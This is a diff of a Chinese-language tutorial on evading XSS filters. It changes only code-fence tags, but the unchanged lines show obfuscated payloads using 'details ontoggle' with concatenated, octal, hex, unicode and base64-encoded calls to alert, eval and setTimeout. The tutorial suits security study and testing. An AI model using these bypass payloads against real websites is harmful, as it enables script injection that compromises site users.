@@ -32,7 +32,7 @@
 ![6](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xju6slwuj30ub06raac.jpg)
 
 我们可以利用的类似拼接的对象又多了几个，例如：
-```
+```html
 //一家人就是要整整齐齐
 <details open ontoggle=top['al'%2B'ert'](1) >
 <details open ontoggle=self['al'%2B'ert'](1) >
@@ -53,7 +53,7 @@
 ![11](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xte6v6ioj30uj07bwf4.jpg)
 
 其他编码
-```
+```html
 JS8编码：
 <details open ontoggle=top['al\145rt'](1) >
 JS16编码：
@@ -81,7 +81,7 @@ JS16编码：
 ![15](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xwgo4zb3j30fl083wen.jpg)
 
 这样你就能理解下面这个例子了。
-```
+```html
 <details open ontoggle=top[8680439..toString(30)](1); >
 <details open ontoggle=top[11189117..toString(32)](1); >
 ```
@@ -111,7 +111,7 @@ JS16编码：
 
 也可以选择将`alert(1)`编码，因为有eval存在啊，直接拿来用
 
-```
+```html
 <details open ontoggle=top[a='al',b='ev',b%2ba](atob('YWxlcnQoMSk='))>
 <details open ontoggle=top[a='al',b='ev',b%2ba]('\141\154\145\162\164\50\61\51')>
 <details open ontoggle=top[a='al',b='ev',b%2ba]('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
@@ -120,7 +120,7 @@ JS16编码：
 ![10](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xom9zf77j30uj097mxz.jpg)
 
 setTimeout()函数也是没问题的，毕竟也能执行代码。 
-```
+```html
 <details open ontoggle=top[a='meout',b='setTi',b%2ba]('\141\154\145\162\164\50\61\51')>
 ```
 
